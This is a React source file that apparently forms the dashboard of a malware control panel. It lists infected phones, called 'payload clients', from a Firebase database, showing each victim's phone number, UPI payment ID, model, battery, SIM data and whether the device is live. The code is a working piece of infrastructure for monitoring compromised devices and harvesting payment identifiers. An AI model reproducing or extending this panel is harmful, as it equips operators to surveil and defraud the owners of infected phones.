import { useEffect, useState, useMemo } from 'react';
import { db } from '@/lib/firebase';
import { ref, onValue } from 'firebase/database';
import { Link } from 'wouter';
import { Search, Smartphone, Battery, BatteryWarning, Wifi, WifiOff, Cpu, ChevronRight, Activity } from 'lucide-react';
import { Layout } from '@/components/layout';

interface Device {
  id: string;
  phone?: string;
  upi?: string;
  model?: string;
  battery?: string;
  status?: string;
  ping?: string;
  sim1?: string;
  sim2?: string;
}

export function Dashboard() {
  const [devices, setDevices] = useState<Device[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');

  useEffect(() => {
    const clientsRef = ref(db, 'clients');
    const unsubscribe = onValue(clientsRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        const devicesList = Object.keys(data).map((key) => ({
          id: key,
          ...data[key]
        }));
        setDevices(devicesList);
      } else {
        setDevices([]);
      }
      setLoading(false);
    });

    return () => unsubscribe();
  }, []);

  const filteredDevices = useMemo(() => {
    if (!search) return devices;
    const lowerSearch = search.toLowerCase();
    return devices.filter(d => 
      (d.phone && d.phone.toLowerCase().includes(lowerSearch)) ||
      (d.model && d.model.toLowerCase().includes(lowerSearch)) ||
      (d.upi && d.upi.toLowerCase().includes(lowerSearch)) ||
      (d.id.toLowerCase().includes(lowerSearch))
    );
  }, [devices, search]);

  const isOnline = (pingTimestamp: string | undefined) => {
    if (!pingTimestamp) return false;
    const pingTime = parseInt(pingTimestamp, 10);
    if (isNaN(pingTime)) return false;
    // 5 minutes = 300000 ms
    return (Date.now() - pingTime) < 300000;
  };

  const getBatteryValue = (battery: string | undefined) => {
    if (!battery) return 0;
    return parseInt(battery.replace('%', ''), 10) || 0;
  };

  return (
    <Layout>
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center mb-6 gap-4">
        <div>
          <h1 className="text-2xl font-bold font-sans tracking-tight">Active Nodes</h1>
          <p className="text-muted-foreground font-mono text-sm mt-1 flex items-center gap-2">
            <Activity className="w-4 h-4 text-primary" />
            <span>{devices.length} devices monitored globally</span>
          </p>
        </div>
        
        <div className="relative w-full md:w-80">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
          <input 
            type="text"
            placeholder="Search phone, model, UPI..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="w-full bg-card border border-border rounded-md py-2 pl-9 pr-4 text-sm font-mono focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-all placeholder:text-muted-foreground"
          />
        </div>
      </div>

      {loading ? (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {[1, 2, 3, 4, 5, 6].map((i) => (
            <div key={i} className="bg-card border border-border rounded-lg h-40 animate-pulse"></div>
          ))}
        </div>
      ) : filteredDevices.length === 0 ? (
        <div className="flex flex-col items-center justify-center bg-card border border-border border-dashed rounded-lg py-24 px-4 text-center">
          <div className="w-16 h-16 rounded-full bg-secondary/50 flex items-center justify-center mb-4">
            <Smartphone className="w-8 h-8 text-muted-foreground" />
          </div>
          <h3 className="text-lg font-medium text-foreground mb-1">No devices found</h3>
          <p className="text-sm text-muted-foreground max-w-sm">
            {search ? 'Adjust your search query to find active devices.' : 'Awaiting initial connection from payload clients.'}
          </p>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both">
          {filteredDevices.map((device, i) => {
            const online = isOnline(device.ping);
            const batteryNum = getBatteryValue(device.battery);
            
            return (
              <Link 
                key={device.id} 
                href={`/device/${device.id}`}
                className="group bg-card border border-border hover:border-primary/50 rounded-lg p-4 flex flex-col relative overflow-hidden transition-all hover:shadow-[0_0_15px_rgba(57,211,83,0.1)] block"
                style={{ animationDelay: `${i * 50}ms` }}
              >
                {/* Status Indicator */}
                <div className="absolute top-0 left-0 w-1 h-full bg-transparent group-hover:bg-primary/50 transition-colors"></div>
                
                <div className="flex justify-between items-start mb-4">
                  <div className="flex items-center gap-2">
                    <div className="bg-secondary rounded p-2 border border-border">
                      <Smartphone className="w-5 h-5 text-muted-foreground group-hover:text-primary transition-colors" />
                    </div>
                    <div>
                      <div className="text-xs font-mono text-muted-foreground">NODE_{i.toString().padStart(3, '0')}</div>
                      <div className="font-semibold text-sm truncate w-32" title={device.model || 'Unknown Model'}>
                        {device.model || 'Unknown Model'}
                      </div>
                    </div>
                  </div>
                  
                  <div className="flex items-center gap-1.5 bg-background border border-border px-2 py-1 rounded-full text-xs font-mono">
                    <span className="relative flex h-2 w-2">
                      {online && <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-primary opacity-75"></span>}
                      <span className={`relative inline-flex rounded-full h-2 w-2 ${online ? 'bg-primary' : 'bg-muted-foreground'}`}></span>
                    </span>
                    <span className={online ? 'text-primary' : 'text-muted-foreground'}>
                      {online ? 'LIVE' : 'OFF'}
                    </span>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-y-3 gap-x-2 text-sm mt-auto">
                  <div className="flex flex-col">
                    <span className="text-[10px] text-muted-foreground uppercase font-mono tracking-wider">Phone</span>
                    <span className="font-medium font-mono text-xs">{device.phone || 'N/A'}</span>
                  </div>
                  <div className="flex flex-col">
                    <span className="text-[10px] text-muted-foreground uppercase font-mono tracking-wider">UPI ID</span>
                    <span className="font-medium font-mono text-xs text-primary/90">{device.upi || 'N/A'}</span>
                  </div>
                </div>
                
                <div className="mt-4 pt-3 border-t border-border flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="flex items-center gap-1 text-xs text-muted-foreground font-mono">
                      {batteryNum <= 20 ? (
                        <BatteryWarning className="w-3.5 h-3.5 text-warning" />
                      ) : (
                        <Battery className="w-3.5 h-3.5" />
                      )}
                      <span className={batteryNum <= 20 ? 'text-warning' : ''}>{device.battery || '0%'}</span>
                    </div>
                  </div>
                  <ChevronRight className="w-4 h-4 text-muted-foreground group-hover:text-primary transition-colors group-hover:translate-x-1" />
                </div>
              </Link>
            );
          })}
        </div>
      )}
    </Layout>
  );
}
